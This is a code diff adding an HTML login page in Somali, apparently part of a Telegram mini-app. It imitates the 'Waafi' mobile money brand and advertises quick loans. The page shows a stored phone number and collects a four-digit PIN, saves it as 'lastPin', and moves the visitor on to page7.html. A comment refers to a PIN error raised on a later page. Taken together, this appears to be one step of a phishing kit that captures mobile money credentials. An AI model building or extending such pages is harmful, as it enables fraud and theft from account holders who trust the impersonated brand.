@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waafi - Galitaanka</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+
+        .header-box { width: 100%; background: linear-gradient(to bottom, #82d13d, #a3e635); padding: 40px 20px; color: white; text-align: center; box-sizing: border-box; }
+
+        .main-content { width: 90%; max-width: 400px; margin: 40px auto 0; text-align: center; flex-grow: 1; }
+
+        .footer-box { width: 100%; background: linear-gradient(to top, #82d13d, #a3e635); padding: 50px 20px 30px; color: white; text-align: center; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; box-sizing: border-box; }
+
+        .logo-text { font-size: 36px; font-weight: bold; margin: 0; }
+        .sub-text { font-size: 15px; margin-top: 8px; opacity: 0.9; }
+        .version-text { font-size: 12px; margin-top: 15px; opacity: 0.8; }
+        .terms-text { font-size: 11px; margin-top: 15px; padding: 0 40px; }
+
+        h2 { color: #555; font-size: 24px; margin-bottom: 25px; }
+
+        .phone-display {
+            border: 2px solid #82d13d;
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 40px;
+            font-size: 20px;
+            color: #333;
+        }
+
+        .pin-label { color: #888; margin-bottom: 20px; }
+
+        .pin-container { display: flex; justify-content: center; align-items: center; gap: 8px; }
+
+        .pin-input-group { display: flex; gap: 8px; }
+
+        .pin-box {
+            width: 55px;
+            height: 55px;
+            border: 1.5px solid #82d13d;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
+        }
+
+        .toggle-eye { cursor: pointer; margin-left: 10px; font-size: 20px; }
+
+        .btn-gal {
+            background-color: #e0e0e0;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 20px;
+            margin-top: 30px; /* Reduced margin to fit status msg */
+            cursor: not-allowed;
+            font-weight: bold;
+        }
+
+        .btn-gal.active {
+            background-color: #82d13d;
+            cursor: pointer;
+        }
+
+        #status-msg {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: bold;
+            height: 20px;
+        }
+
+        .spacer { height: 40px; }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    <p class="logo-text">Waafi</p>
+    <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
+</div>
+
+<div class="main-content">
+    <h2>Gal</h2>
+
+    <div class="phone-display">
+        <span>🇸🇴</span>
+        <span id="displayPhone">+252 ...</span>
+    </div>
+
+    <p class="pin-label">Geli PIN-kaaga</p>
+
+    <div class="pin-container">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        </div>
+        <span class="toggle-eye" id="eyeIcon">👁️</span>
+    </div>
+
+    <div id="status-msg"></div>
+
+    <button id="loginBtn" class="btn-gal" disabled>GAL</button>
+    <div class="spacer"></div>
+</div>
+
+<div class="footer-box">
+    <p class="logo-text">Waafi</p>
+    <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
+    <p class="version-text">v2.1.3P</p>
+    <p class="terms-text">Galitaanka markaad gasho waad ogolaatay <u>Shuruudaha iyo Xaaladaha</u></p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
+    const statusMsg = document.getElementById('status-msg');
+
+    // ✅ CHECK FOR PIN ERROR FROM PAGE 9
+    if (localStorage.getItem('pinError') === 'true') {
+        statusMsg.style.color = "red";
+        statusMsg.innerText = "🔑 PIN waa khalad. Fadlan mar kale isku day.";
+        localStorage.removeItem('pinError'); // Clear it so it doesn't show next time
+    }
+
+    const savedPhone = localStorage.getItem('phone');
+    displayPhone.textContent = savedPhone ? `+252 ${savedPhone}` : "+252 (ma jiro)";
+
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+            if (box.value && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
+
+    eye.addEventListener('click', () => {
+        const show = pinBoxes[0].type === "password";
+        pinBoxes.forEach(b => b.type = show ? "text" : "password");
+        eye.textContent = show ? "🫣" : "👁️";
+    });
+
+    loginBtn.addEventListener('click', () => {
+        let pin = "";
+        pinBoxes.forEach(b => pin += b.value);
+        localStorage.setItem('lastPin', pin);
+        window.location.href = "page7.html"; // Ensure this matches your naming
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
